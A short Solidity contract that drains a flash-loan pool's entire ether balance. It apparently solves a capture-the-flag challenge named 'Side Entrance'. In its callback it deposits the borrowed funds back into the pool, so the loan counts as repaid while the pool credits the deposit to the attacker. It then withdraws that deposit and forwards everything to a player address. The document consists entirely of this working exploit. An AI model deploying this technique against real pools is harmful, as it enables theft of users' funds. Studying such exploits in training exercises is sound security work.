// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


interface IPool {
    function flashLoan(uint256 amount) external;
    function deposit() external payable;
    function withdraw() external;
}

contract AttackSideEntrance {

    IPool immutable pool;
    address immutable player;

    constructor(address _pool, address _player){
        pool = IPool(_pool);
        player = _player;
    }

    function attack() external {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        (bool success, ) = player.call{value: address(this).balance}("");
    }

    function execute() external payable {
        require(tx.origin == player);
        require(msg.sender == address(pool));

        pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}
